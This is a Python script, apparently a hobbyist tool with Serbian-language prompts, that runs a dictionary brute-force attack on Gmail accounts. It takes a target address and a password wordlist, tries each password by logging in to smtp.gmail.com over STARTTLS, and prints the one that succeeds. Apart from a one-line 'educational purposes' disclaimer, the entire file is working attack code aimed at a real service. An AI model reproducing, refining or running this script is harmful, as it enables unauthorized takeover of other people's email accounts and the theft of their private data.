#!/usr/bin/env python3

__coder__ = 'Ivica Lazarevic'
__scriptName__ = 'gmailKreker.py'
__version__ = '0.1'
__site__ = 'pythonbytes.rs'

import sys
import smtplib
from subprocess import call

try:
    from tqdm import tqdm
    from colorama import Fore
except:
    call('pip3 install colorama tqdm', shell=True)
    exit()


def logo():
    print(Fore.RED+"\n       __           __        ____      __        ")
    print(Fore.RED+"  ____/ /___ ______/ /_______/ __ \____/ /__  _____ ")
    print(Fore.RED+" / __  / __ `/ ___/ //_/ ___/ / / / __  / _ \/ ___/ ")
    print(Fore.RED+"/ /_/ / /_/ / /  / ,< / /__/ /_/ / /_/ /  __/ /     ")
    print(Fore.RED+"\__,_/\__,_/_/  /_/|_|\___/\____/\__,_/\___/_/      ")
    print(Fore.RED+"                                                \n")
    print(Fore.RED+'                               Naziv: '+ __scriptName__)
    print(Fore.RED+'                               Verzija: '+ __version__)
    print(Fore.RED+'                               Koder: '+ __coder__)
    print(Fore.RED+ '                               Sajt: ' + __site__+Fore.WHITE)

if sys.platform == 'linux' or sys.platform == 'linux2' or sys.platform == 'darwin':
    call('clear', shell=True)
    logo()
else:
    call('cls', shell=True)
    logo()

def gmailKreker(KORISNIK, lozinka, SMTP_SERVER, SMTP_PORT):
        smtpServer = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        smtpServer.ehlo()
        smtpServer.starttls()
        try:
            smtpServer.login(KORISNIK, lozinka)
            progressBar.close()
            print(f'\n\n[!] Pronasli smo lozinku: {lozinka}')
            exit()

        except smtplib.SMTPAuthenticationError:
            return

if __name__ == '__main__':
    print('\n[+] Dobrodosli u Gmail kreker!')
    print('[+] Napisano u edukativne svrhe, koristiti na svoju odgovornost!!!')
    print('[!] Skripta koristi brute force napad sa recnikom!')
    SMTP_SERVER = 'smtp.gmail.com'
    SMTP_PORT = 587
    RECNIK = input('\n[+] Molimo vas unesite naziv/putanju do recnika sa lozinkama: ')
    KORISNIK = input('[+] Molimo vas unesite korisnicki nalog koji zelite da krekujete: ')

    try:
        LOZINKE = open(RECNIK, 'r', errors='ignore').readlines()
        print(f'\n[+] Broj ucitanih lozinki iz recnika: {len(LOZINKE)}\n')
        progressBar = tqdm(LOZINKE, bar_format='{l_bar}%s{bar}%s{r_bar}' % (Fore.RED, Fore.RESET))
        for lozinka in progressBar:
            lozinka = lozinka.strip('\n')
            gmailPass = gmailKreker(KORISNIK, lozinka, SMTP_SERVER, SMTP_PORT)

    except(KeyboardInterrupt):
        exit('[-] Skripta prekinuta sa radom!')
    except:
        pass

    print(f'\n[+] Hvala vam sto ste koristili ovu skriptu!')